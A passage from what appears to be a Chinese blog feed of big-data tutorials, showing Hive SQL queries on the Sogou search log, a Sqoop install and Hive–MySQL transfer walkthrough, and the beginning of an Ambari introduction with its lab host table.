sogou_partition  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj_backup  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line">#最后向分区表中导入数据</span><br><span class="line">#开启动态分区非严格模式</span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition.mode<span class="operator">=</span>nonstrict;</span><br><span class="line">#禁用矢量运行</span><br><span class="line"><span class="keyword">set</span> hive.vectorized.execution.enabled<span class="operator">=</span><span class="literal">false</span>;</span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> sogou.sogou_partition <span class="keyword">partition</span>(<span class="keyword">year</span>, <span class="keyword">month</span>, <span class="keyword">day</span>, <span class="keyword">hour</span>) <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_ext;</span><br><span class="line">#查看数据</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211008220145786.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008220145786"></p><p><img "" class="lazyload placeholder" data-original="image-20211008220222053.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008220222053"></p><p><img "" class="lazyload placeholder" data-original="image-20211008220457507.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008220457507"></p><h3 id="数据分析需求1条数统计"><a class="markdownIt-Anchor" href="#数据分析需求1条数统计">#</a> 数据分析需求（1）：条数统计</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询总数据条数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211008221558788.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211008221558788"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询关键词非空数据</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">and</span> keyword <span class="operator">!=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009083441029.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009083441029"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#无重复总条数（根据ts, uid, keyword, url）</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> ts,uid,keyword,url <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">=</span> <span class="number">1</span> ) t;</span><br><span class="line">#需要给子表起个名</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009114925786.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009114925786"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#统计独立uid条数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(uid)) <span class="keyword">from</span> sogou.sogou_ext;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009115150331.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009115150331"></p><h3 id="数据分析需求2关键词分析"><a class="markdownIt-Anchor" href="#数据分析需求2关键词分析">#</a> 数据分析需求（2）：关键词分析</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查询关键词平均长度</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(a.cnt) <span class="keyword">from</span> (<span class="keyword">select</span> size(split(keyword,<span class="string">&#x27; s+&#x27;</span>)) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext) a;</span><br><span class="line">#由于split函数不支持矢量计算，需要先关闭该功能</span><br><span class="line"><span class="keyword">set</span> hive.vectorized.execution.enabled<span class="operator">=</span><span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009122646106.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009122646106"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询频度排名前<span class="number">50</span></span><br><span class="line"><span class="keyword">select</span> keyword,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> keyword <span class="keyword">order</span> <span class="keyword">by</span> cnt <span class="keyword">desc</span> limit <span class="number">50</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009122909785.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009122909785"></p><h3 id="数据分析需求3uid分析"><a class="markdownIt-Anchor" href="#数据分析需求3uid分析">#</a> 数据分析需求（3）：UID 分析</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#为了统计UID的查询次数分布（查询<span class="number">1</span>次的UID个数…查询n次的UID个数），这里我们列出查询<span class="number">1</span>次、<span class="number">2</span>次、<span class="number">3</span>次和大于<span class="number">3</span>次的UID个数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(if(uids.cnt<span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)),<span class="built_in">sum</span>(if(uids.cnt<span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)), <span class="built_in">sum</span>(if(uids.cnt<span class="operator">=</span><span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>)), <span class="built_in">sum</span>(if(uids.cnt<span class="operator">&gt;</span><span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>)) <span class="keyword">from</span> (<span class="keyword">select</span> uid, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid) uids;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009123459384.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009123459384"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#统计UID平均查询次数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(a.cnt)<span class="operator">/</span><span class="built_in">count</span>(a.uid)<span class="keyword">from</span>(<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid) a;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009124613760.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009124613760"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#统计查询次数大于<span class="number">2</span>次的用户占比：</span><br><span class="line">#先统计B:UID总数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(uid)) <span class="keyword">as</span> A <span class="keyword">from</span> sogou.sogou_ext;</span><br><span class="line">#统计查询A:次数大于<span class="number">2</span>的UID个数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(a.uid) <span class="keyword">as</span> B <span class="keyword">from</span> (<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid <span class="keyword">having</span> cnt<span class="operator">&gt;</span><span class="number">2</span>)a;</span><br><span class="line">#占比结果是C<span class="operator">=</span>B<span class="operator">/</span>A</span><br><span class="line">#查询次数大于<span class="number">2</span>次的数据如下</span><br><span class="line"><span class="keyword">select</span> b.<span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">group</span> <span class="keyword">by</span> uid <span class="keyword">having</span> cnt <span class="operator">&gt;</span><span class="number">2</span>) a <span class="keyword">join</span> sogou.sogou_ext b <span class="keyword">on</span> a.uid<span class="operator">=</span>b.uid limit <span class="number">50</span>;</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211009124722432.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009124722432"></p><p><img "" class="lazyload placeholder" data-original="image-20211009124814645.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009124814645"></p><p><img "" class="lazyload placeholder" data-original="image-20211009125148463.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009125148463"></p><h3 id="数据分析需求4用户行为分析"><a class="markdownIt-Anchor" href="#数据分析需求4用户行为分析">#</a> 数据分析需求（4）：用户行为分析</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#点击次数与rank之间的关系</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> rank <span class="operator">&lt;</span> <span class="number">11</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4999869</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#直接输入url进行查询的比例</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">like</span><span class="string">&#x27;%www%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">73979</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#用户访问的网站包含用户输入的url类型关键词</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(if(instr(url，keyword)<span class="operator">&gt;</span><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>)) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">like</span> <span class="string">&#x27;%www%&#x27;</span>)a;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">27561</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#查询独立用户行为</span><br><span class="line"><span class="keyword">select</span> uid, <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">as</span> cnt <span class="keyword">from</span> sogou.sogou_ext <span class="keyword">where</span> keyword <span class="keyword">like</span><span class="string">&#x27;%仙剑奇侠传%&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> uid <span class="keyword">having</span> cnt <span class="operator">&gt;</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+------+</span></span><br><span class="line"><span class="operator">|</span>                uid                <span class="operator">|</span> cnt  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">265</span>f1fa26029c058c695ecc7ee4bad01  <span class="operator">|</span> <span class="number">4</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>b136abffd8f0dd38d97a52a7e50f7fb  <span class="operator">|</span> <span class="number">4</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">40</span>aa046859609c25b3914ac9f2735c5c  <span class="operator">|</span> <span class="number">5</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">653</span>d48aa356d5111ac0e59f9fe736429  <span class="operator">|</span> <span class="number">9</span>    <span class="operator">|</span></span><br></pre></td></tr></table></figure><h2 id="sqoop-应用与开发"><a class="markdownIt-Anchor" href="#sqoop-应用与开发">#</a> Sqoop 应用与开发</h2><p>在实际开发中我们经常会碰到这样一种需求，即大数据平台处理完的数据需要导入关系型数据库，反之关系型数据库中的数据也需要导入大数据平台，为此大数据平台为我们提供了 Sqoop 工具来解决这一需求。</p><h3 id="sqoop简介"><a class="markdownIt-Anchor" href="#sqoop简介">#</a> Sqoop 简介</h3><p>Sqoop 是 Apache 开源的顶级项目之一，用于在 ApacheHadoop 和关系型数据库等结构化数据存储之间高效传输大容量数据的工具。也就是说，Sqoop 是一款类 ETL 工具，主要负责将大数据平台处理完的数据导入关系型数据库中，或者将关系型数据库中的数据带入大数据平台。</p><h3 id="sqoop安装部署"><a class="markdownIt-Anchor" href="#sqoop安装部署">#</a> Sqoop 安装部署</h3><p>安装环境<br>在安装 Sqoop 之前确保 hadoop 正确启动，运行，mysql 正常运行。<br>解压安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gz</span><br><span class="line">mv sqoop-1.4.7.bin__hadoop-2.6.0 /usr/local/sqoopmv sqoop-1.4.7.bin__hadoop-2.6.0 /usr/local/sqoop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">更改目录权限</span></span><br><span class="line">chown hadoop:hadoop -R /usr/local/sqoop/</span><br></pre></td></tr></table></figure><p>配置 Sqoop</p><ol><li>配置 MySQL 连接器<br> Sqoop 底层通过 JDBC 的方式访问 MySQL 数据库，所以需要把 MySQL 数据库的驱动程序复制到 Sqoop 的依赖包，这里可以使用 hive 的 mysql 驱动（如果有）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/hive/lib/mysql-connector-java-5.1.32.jar  /usr/local/sqoop/lib/</span><br></pre></td></tr></table></figure><ol start="2"><li>配置环境变量<br>进入到 Sqoop 的 conf 目录下，找到 sqoop-env-template.sh 文件，<a href="http://xn--sqoop-env-fp6nq62cnhb6779b.sh">重命名为 sqoop-env.sh</a>，打开进行环境变量的配置</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/sqoop/conf/sqoop-env-template.sh  /usr/local/sqoop/conf/sqoop-env.sh</span><br><span class="line">vi /usr/local/sqoop/conf/sqoop-env.sh</span><br></pre></td></tr></table></figure><ol start="3"><li>将 commons-log.jar 包放在 lib 下。<br><a href="https://mirrors.tuna.tsinghua.edu.cn/apache//commons/lang/binaries/commons-lang-2.6-bin.zip">https://mirrors.tuna.tsinghua.edu.cn/apache//commons/lang/binaries/commons-lang-2.6-bin.zip</a></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv commons-lang-2.6.jar /usr/local/sqoop/lib/</span><br><span class="line">chown hadoop:hadoop /usr/local/sqoop/lib/commons-lang-2.6.jar</span><br></pre></td></tr></table></figure><h3 id="sqoop将hive表中的数据导入mysql"><a class="markdownIt-Anchor" href="#sqoop将hive表中的数据导入mysql">#</a> Sqoop 将 Hive 表中的数据导入 MySQL</h3><p><strong>实验条件</strong><br> MySQL 正常启动<br><strong>构建 MySQL 数据库中的表</strong></p><ol><li>登录 MySQL<br> 登录 MySQL 的命令</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p</span><br></pre></td></tr></table></figure><ol start="2"><li>创建数据库</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> test;</span><br></pre></td></tr></table></figure><ol start="3"><li>创建表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>  test.uid_cnt (uid <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="keyword">null</span>,cnt <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">default</span> <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p><strong>构建 Hive 数据仓库中的表</strong></p><ol><li>进入 Hive</li><li>创建 Hive 中的表 sogou.sogou_uid_cnt</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sogou.sogou_uid_cnt(uid string,cnt <span class="type">int</span>) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>向表中写入数据</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> sogou.sogou_uid_cnt <span class="keyword">select</span> uid,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou_500w <span class="keyword">group</span> <span class="keyword">by</span> uid;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_uid_cnt limit <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p><strong>使用 Sqoop 工具将 Hive 的数据导入 MySQL</strong></p><ol><li>导入命令</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>sqoop<span class="operator">/</span>bin<span class="operator">/</span>sqoop export <span class="comment">--connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --export-dir &#x27;hdfs://master:9000/user/hive/warehouse/sogou.db/sogou_uid_cnt&#x27; --fields-terminated-by &#x27;\t&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>以上命令的解释如下<br> sqoop export 表示数据从 Hive 复制到 MySQL 数据库中；–connect jdbc:mysql://master:3306/test 表示连接 MySQL 数据库 test；–username root 表示连接 MySQL 数据库的用户名；–password 12345 表示连接 MySQL 数据库的密码；–table uid_cnt 表示 MySQL 中的表即将被导入的表名称；–export-dir '/user/hive/warehouse/sogou.db/uid_cnt’表示 Hive 中被导出的文件路径；–fields-terminated-by '\t’表示 Hive 中被导出的文件字段的分隔符。</p></li><li><p>以上命令成功运行之后会在控制台打印输出如下结果</p></li><li><p>最后，验证结果数据。<br>登录 MySQL 数据库，查询库 test 的表 uid_cnt 中是已经有了数据，如果有数据说明 Sqoop 工具将 Hive 中的数据成功导入了 MySQL。</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.uid_cnt limit <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test.uid_cnt;</span><br></pre></td></tr></table></figure><p><strong>使用 Sqoop 工具将 MySQL 中的数据导入 Hive 表</strong><br>前面我们成功地将 Hive 表 sogou_uid_cnt 中的数据导入 MySQL 数据库的 uid_cnt 表，反之，我们再利用 Sqoop 工具将表 uid_cnt 中的数据导入表 sogou_uid_cnt2 中</p><ol><li>首先，在 Hive 中创建表 sogou_uid_cnt2</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sogou.sogou_uid_cnt2(uid string,cnt <span class="type">int</span>) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="keyword">describe</span> sogou.sogou_uid_cnt2;</span><br></pre></td></tr></table></figure><ol start="2"><li>然后，我们就可以使用 Sqoop 工具将 MySQL 中表 uid_cnt 的数据导入 Hive 的表 sogou_uid_cnt<br> 在导入数据之前，/user/hive/warehouse/sogou.db/sogou_uid_cnt2 已经存在，我们将其删除。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hdfs dfs -rmdir /user/hive/warehouse/sogou.db/sogou_uid_cnt2</span><br><span class="line"></span><br><span class="line">/usr/local/sqoop/bin/sqoop import --connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --target-dir /user/hive/warehouse/sogou.db/sogou_uid_cnt2 --fields-terminated-by &#x27;\t&#x27; -m 1</span><br></pre></td></tr></table></figure><ol start="3"><li>进入 Hive 进行验证</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou.sogou_uid_cnt2 limit <span class="number">10</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ambari</title>
      <link href="/2021/09/28/Ambari/"/>
      <url>/2021/09/28/Ambari/</url>
      
        <content type="html"><![CDATA[<h1 id="ambari"><a class="markdownIt-Anchor" href="#ambari">#</a> Ambari</h1><h2 id="1什么是ambari"><a class="markdownIt-Anchor" href="#1什么是ambari">#</a> 1. 什么是 Ambari</h2><p>Apache Ambari 项目旨在通过开发用于配置，管理和监视 Apache Hadoop 集群的软件来简化 Hadoop 管理。Ambari 通过其 RESTful API 提供了直观，易于使用的 Hadoop 管理 Web UI。</p><p>Ambari 使系统管理员可以：</p><ul><li><p>设置 Hadoop 集群</p><ul><li>Ambari 提供了用于在任意数量的主机上安装 Hadoop 服务的分步向导。</li><li>Ambari 处理群集的 Hadoop 服务的配置。</li></ul></li><li><p>管理 Hadoop 集群</p><ul><li>Ambari 提供了用于在整个集群中启动，停止和重新配置 Hadoop 服务的集中管理。</li></ul></li><li><p>监控 Hadoop 集群</p><ul><li>Ambari 提供了一个仪表板，用于监视 Hadoop 集群的运行状况和状态。</li><li>Ambari 利用<a href="https://issues.apache.org/jira/browse/AMBARI-5707"> Ambari Metrics System</a> 收集指标。</li><li>Ambari 利用<a href="https://issues.apache.org/jira/browse/AMBARI-6354"> Ambari Alert Framework</a> 进行系统警报，并在需要您关注时（例如，节点故障，剩余磁盘空间不足等）通知您。</li></ul></li></ul><p>Ambari 使应用程序开发人员和系统集成商能够：</p><ul><li>使用<a href="https://github.com/apache/blob/trunk/ambari-server/docs/api/v1/index.md"> Ambari REST API</a> 轻松将 Hadoop 的配置，管理和监视功能集成到自己的应用<a href="https://github.com/apache/blob/trunk/ambari-server/docs/api/v1/index.md">程序中</a>。</li></ul><p>官方网站：<a href="http://ambari.apache.org/">http://ambari.apache.org/</a></p><h2 id="2ambari架构"><a class="markdownIt-Anchor" href="#2ambari架构">#</a> 2.Ambari 架构</h2><p><img "" class="lazyload placeholder" data-original="20201010140739738.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><h3 id="ambari-server"><a class="markdownIt-Anchor" href="#ambari-server">#</a> ambari-server</h3><ul><li>提供外部访问的 API</li><li>接受 Ambari-agent 的心跳信息和管理 Ambari-agent</li><li>元数据的管理和数据库的访问</li></ul><h3 id="ambari-agent"><a class="markdownIt-Anchor" href="#ambari-agent">#</a> ambari-agent</h3><ul><li>采集所在节点的信息并且汇总发心跳汇报给 ambari-server</li><li>处理 ambari-server 的执行请求，安装、启动、停止服务等</li></ul><h3 id="ambari-web"><a class="markdownIt-Anchor" href="#ambari-web">#</a> ambari-web</h3><ul><li>提供可视化的操作界面</li></ul><h2 id="3下载"><a class="markdownIt-Anchor" href="#3下载">#</a> 3. 下载</h2><p>Ambari 所在的公司已经被 Cloudera 公司收购所以相关的文档都在 clodera 公司的官方网站：<a href="https://docs.cloudera.com/HDPDocuments/index.html">https://docs.cloudera.com/HDPDocuments/index.html</a></p><p>我们选择的安装方式是：Ambari+HDP+HDP-UTILS, 因为 Ambari 本身只是一个大数据平台自动化部署和管理的工具，所以需要配合 HDP (大数据软件安装包集合) 一起使用。</p><p><img "" class="lazyload placeholder" data-original="image-20211009131251511.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009131251511"></p><p>选择合适的版本，我们这里选择的是 2.7.0.0 版本，然后就会有一个安装指南：<a href="https://docs.cloudera.com/HDPDocuments/Ambari-2.7.0.0/bk_ambari-installation/content/ambari_repositories.html">https://docs.cloudera.com/HDPDocuments/Ambari-2.7.0.0/bk_ambari-installation/content/ambari_repositories.html</a></p><p>其实可以直接配置官网提供的 yum 源就可以安装，但是由于是国外的网站，速度比较慢，所以就使用离线本地 yum 源的安装方式</p><h2 id="4安装环境说明"><a class="markdownIt-Anchor" href="#4安装环境说明">#</a> 4. 安装环境说明</h2><p>使用 VMWare/VirtualBox，虚拟四台虚拟机，(也可以将 server 配置在一台节点中) 其中 ambari 是服务器，其他为 HDP 安装节点，配置如下:</p><table><thead><tr><th style="text-align:center">主机</th><th style="text-align:center">系统</th><th style="text-align:center"><strong>网络</strong></th><th style="text-align:center">内存</th><th>磁盘</th></tr></thead><tbody><tr><td style="text-align:center">ambari</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.160(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr><tr><td style="text-align:center">hdp-1</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.161(NAT/birdge)</td><td style="text-align:center">4G</td><td>50G</td></tr><tr><td style="text-align:center">hdp-2</td><td style="text-align:center">CentOS7</td><td style="text-align:center">172.18.74.162(NAT/birdge)</td><td 